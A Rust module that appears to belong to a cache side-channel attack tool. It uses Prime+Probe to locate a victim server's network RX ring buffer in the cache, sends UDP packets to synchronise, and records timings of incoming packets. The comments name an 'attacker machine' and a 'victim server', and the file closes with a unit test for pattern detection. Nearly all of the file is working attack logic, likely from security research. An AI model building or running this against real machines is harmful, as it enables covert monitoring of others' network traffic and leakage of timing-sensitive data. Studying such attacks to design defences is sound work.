//! # Online Tracking
//! This module is responsible for tracking and gathering measurements on the state
//! of the RX buffer of the victim machine.

mod pattern;
mod tracking;

use crate::connection::CacheConnector;
pub use crate::connection::Time;
use crate::output::Record;
pub use crate::rpp::params::CacheParams;
pub use crate::rpp::{
    has_activation, ColorCode, ColoredSetCode, Contents, Latencies, ProbeResult, ProbeResult::*,
    Rpp, SetCode,
};
use pattern::{Pattern, PatternIdx, PossiblePatterns};
use std::collections::HashMap;
use std::io::Result;
use std::io::{Error, ErrorKind};
use std::net::{SocketAddr, ToSocketAddrs, UdpSocket};
use std::time::Instant;
pub use tracking::SyncStatus;
use tracking::TrackingContext;

pub type LatsEntry = (Vec<ProbeResult<Latencies>>, SyncStatus, Time);
pub type SavedLats = Vec<LatsEntry>;

const REPEATINGS: usize = 8;
const MAX_FAIL_CNT: usize = 100;

pub struct OnlineTracker<C, R> {
    rpp: Rpp<C>,
    output: R,
    sock: UdpSocket,
    sock_addr: SocketAddr,
    pattern: Pattern,
    quite: bool,
}

impl<C, R> OnlineTracker<C, R>
where
    C: CacheConnector<Item = Contents>,
    R: Record<LatsEntry>,
{
    /// Creates a new online tracker.
    ///
    /// # Arguements
    ///
    /// - `addr` - Socket Address of the victim server (used for control packets, like synchronization of ring buffer possition)
    /// - `conn` - A memory connector, which will be used for communication with the server  
    /// - `quite` - Whether Online Tracker should report the progress
    /// - `output` - An object recording results
    ///
    /// # Fails
    ///
    /// Fails if port 9009 is used on the attacker machine or if the given
    /// address is unapropriet for connecting to.  
    pub fn new<A: ToSocketAddrs>(
        addr: A,
        conn: C,
        quite: bool,
        output: R,
    ) -> Result<OnlineTracker<C, R>> {
        let rpp = Rpp::new(conn, quite);

        // Allow the machine to automatically choose port for us
        let sock = UdpSocket::bind("0.0.0.0:0").map_err(|e| {
            Error::new(
                ErrorKind::AddrNotAvailable,
                format!("ERROR: could not bind to address: {}", e),
            )
        })?;

        // We do it this way and not by `connection` method be able to send to 
        // closed ports (with connection we would get ICMP back and fail next time)
        let sock_addr = addr.to_socket_addrs()?.next().ok_or(Error::new(
            ErrorKind::InvalidData,
            "ERROR: could not resolve address.",
        ))?;

        // sock.set_nonblocking(true).map_err(|e| {
        //     Error::new(
        //         ErrorKind::ConnectionRefused,
        //         format!("ERROR: Could not set non blocking: {}", e),
        //     )
        // })?;

        Ok(OnlineTracker {
            rpp,
            sock,
            output,
            sock_addr,
            pattern: Default::default(),
            quite,
        })
    }

    pub fn set_broadcast(&mut self, val: bool) -> Result<()> {
        self.sock.set_broadcast(val)
    }

    /// The same as new, but passes provided cache parameters to underlying RPP
    pub fn for_cache<A: ToSocketAddrs>(
        addr: A,
        conn: C,
        quite: bool,
        output: R,
        cparam: CacheParams,
    ) -> Result<OnlineTracker<C, R>> {
        let rpp = Rpp::with_params(conn, quite, cparam);

        // Allow the machine to automatically choose port for us
        let sock = UdpSocket::bind("0.0.0.0:0").map_err(|e| {
            Error::new(
                ErrorKind::AddrNotAvailable,
                format!("ERROR: could not bind to address: {}", e),
            )
        })?;

        // We do it this way and not by `connection` method be able to send to 
        // closed ports (with connection we would get ICMP back and fail next time)
        let sock_addr = addr.to_socket_addrs()?.next().ok_or(Error::new(
            ErrorKind::InvalidData,
            "ERROR: could not resolve address.",
        ))?;

        // sock.set_nonblocking(true).map_err(|e| {
        //     Error::new(
        //         ErrorKind::ConnectionRefused,
        //         format!("ERROR: Could not set non blocking: {}", e),
        //     )
        // })?;

        Ok(OnlineTracker {
            rpp,
            output,
            sock_addr,
            sock,
            pattern: Default::default(),
            quite,
        })
    }

    /// Sets the verbosity of the Online Tracker instance
    pub fn set_quite(&mut self, quite: bool) {
        self.quite = quite;
    }

    /// Starts online tracking phase.
    ///
    /// # Fails
    ///
    /// Fails if:
    ///
    /// - Priming or probing of sets for a given
    /// - UDP connection for a provided at creation adress fails (cannot send packets)
    /// - No pattern in cache could be found even after retries
    /// - Cannot find the initial possition in RX buffer of the victim server
    ///
    // UGLY maybe there is some other way to handle retries?
    pub fn track(&mut self, cnt: usize) -> Result<()> {
        use console::style;
        let mut err_cnt = 0;
        let quite = self.quite;

        if !quite {
            eprintln!("Online Tracker: {}", style("STARTED").green());
        }
        while let Err(e) = self.locate_rx() {
            err_cnt += 1;
            if err_cnt > MAX_FAIL_CNT {
                return Err(Error::new(
                    ErrorKind::NotConnected,
                    format!("ERROR: Could not loacte RX buffer in memory: {}", e),
                ));
            }
        }
        if !quite {
            eprintln!("Online Tracker: {}", style("Located ring buffer").green());
            eprintln!("Online Tracker: {}", style("Starting measurements").green());
        }

        err_cnt = 0;
        while let Err(e) = self.measure(cnt) {
            err_cnt += 1;

            if err_cnt > MAX_FAIL_CNT {
                return Err(e);
            }
        }

        if !quite {
            eprintln!(
                "Online Tracker: {}",
                style("MEASUREMENTS COMPLETED").green()
            );
        }

        Ok(())
    }

    /// Locates the RX buffer in the cache. The buffer is expected to reside
    /// on a single page and be a single for the os (sometimes there might be
    /// multiple RX buffers). Repeats the process if the pattern is indistinctive.
    ///
    /// # Fails
    ///
    /// Fails if Prime or Probe fails, if there are issues with sending UDP
    /// packets to the target, and if the pattern cannot be found in the set
    /// of data.
    fn locate_rx(&mut self) -> Result<()> {
        let patterns = self.locate_rx_round()?;
        self.pattern = Pattern::find(patterns)?;

        Ok(())
    }

    fn locate_rx_round(&mut self) -> Result<PossiblePatterns> {
        let mut patterns = HashMap::with_capacity(self.rpp.colors_len());
        let color_codes = self.rpp.colors().collect::<Vec<ColorCode>>();

        for color_code in color_codes.into_iter() {
            let color_len = self.rpp.color_len(color_code);
            let mut pattern = Vec::with_capacity(color_len);
            let set_codes = self
                .rpp
                .iter_color(color_code)
                .collect::<Vec<ColoredSetCode>>();

            for _ in 0..REPEATINGS {
                for &colored_set_code in set_codes.iter() {
                    let set_code = SetCode(color_code, colored_set_code);
                    self.rpp.prime(&set_code)?;
                    // DEBUG this causes connection refused error
                    self.send_packet()?;
                    self.send_packet()?;
                    if self.rpp.probe(&set_code)?.is_activated() {
                        pattern.push(Some(set_code.1));
                    } else {
                        pattern.push(None);
                    }
                }
            }

            patterns.insert(color_code, pattern);
        }

        Ok(patterns)
    }

    fn get_init_pos(&mut self) -> Result<PatternIdx> {
        let mut err_cnt = 0;

        // We prime and probe the first set in the pattern
        // until we register activation
        loop {
            if err_cnt >= MAX_FAIL_CNT {
                return Err(Error::new(
                    ErrorKind::Other,
                    "ERROR: Cannot determine the initial position in RX",
                ));
            }
            if self.rpp.prime(&self.pattern[0]).is_err() {
                err_cnt += 1;
                continue;
            }
            if self.send_packet().is_err() {
                err_cnt += 1;
                continue;
            }
            match self.rpp.probe(&self.pattern[0]) {
                Ok(Activated(_)) => break,
                Err(_) => err_cnt += 1,
                _ => continue,
            }
        }

        // Then we return the next one, as we expect it to be filled next.
        // Therefore, it corresponds to the starting pointer of ring buffer.
        Ok(1)
    }

    #[inline(always)]
    fn send_packet(&self) -> Result<()> {
        self.sock.send_to(&[0], self.sock_addr)?;
        Ok(())
    }

    fn measure(&mut self, cnt: usize) -> Result<()> {
        let init_pos = self.get_init_pos()?;
        let mut ctx = TrackingContext::new(init_pos);
        let timer = Instant::now();

        for _ in 0..cnt {
            let mut probe_res;
            let es = self.pattern.window(ctx.pos()).copied().collect();
            self.rpp.prime_all(&es)?;

            loop {
                // We should synchronize after every two packets or if the
                // previous synchronization failed. In order to syncronize
                // we need to send our own packet to the server and then
                // see if it activates the expected cache set.
                if ctx.should_inject() {
                    self.send_packet()?;
                    ctx.inject();
                }
                // MAYBE make a newtype for probe_results
                probe_res = self.rpp.probe_all(&es)?;
                // If we measure an activation or injected a packet, then
                // we stop. Any activation in the window should be registered.
                // If the packet got injected, then it is the syncroniztion phase
                // and we should deside on how to handle it
                if has_activation(&probe_res) || ctx.is_injected() {
                    break;
                }
            }

            // if the the *pos* set is activated (which we expect to be activated)
            // then the synchronization is not really needed, and we tacke the next
            // position in the pattern.
            if probe_res[ctx.pos()].is_activated() && ctx.is_injected() {
                ctx.sync_hit(self.pattern.next_pos(ctx.pos()));
            // if we did not register activation of the *pos* set, then we should
            // recover the position from the probes.
            } else if ctx.is_injected() {
                ctx.sync_miss(self.pattern.recover_next(ctx.pos(), &probe_res)?);
            // this case means that we registered some activation and not synchronizing.
            // we need to save this measurement.
            } else {
                ctx.unsynced_meaurement();
            }

            self.save(
                probe_res,
                ctx.sync_status(),
                timer.elapsed().as_nanos() as Time,
            )?;
        }

        Ok(())
    }

    #[inline(always)]
    // NOTE maybe we do not need to store all the information
    fn save(
        &mut self,
        probes: Vec<ProbeResult<Latencies>>,
        stat: SyncStatus,
        timestamp: Time,
    ) -> Result<()> {
        self.output.record((probes, stat, timestamp))
    }
}

#[cfg(test)]
mod tests {
    use super::pattern::Pattern;
    use super::*;

    #[test]
    fn pattern_finding() {
        let measurements = vec![
            Some(1),
            Some(9),
            Some(3),
            Some(4),
            Some(1),
            Some(2),
            Some(3),
            Some(4),
            Some(1),
            Some(2),
            None,
            Some(4),
            Some(1),
            Some(2),
            Some(3),
            Some(4),
            Some(8),
            Some(2),
            Some(4),
            Some(4),
            Some(1),
            Some(2),
            Some(3),
            Some(4),
            Some(1),
            None,
            Some(3),
            Some(4),
            Some(1),
            Some(2),
            Some(3),
            None,
        ];

        let expected: Pattern =
            vec![SetCode(0, 1), SetCode(0, 2), SetCode(0, 3), SetCode(0, 4)].into();

        let mut hm = HashMap::new();
        hm.insert(0, measurements);

        let pattern = Pattern::find(hm).expect("No pattern found");
        assert_eq!(expected, pattern, "The pattern is incorrect");
    }
}
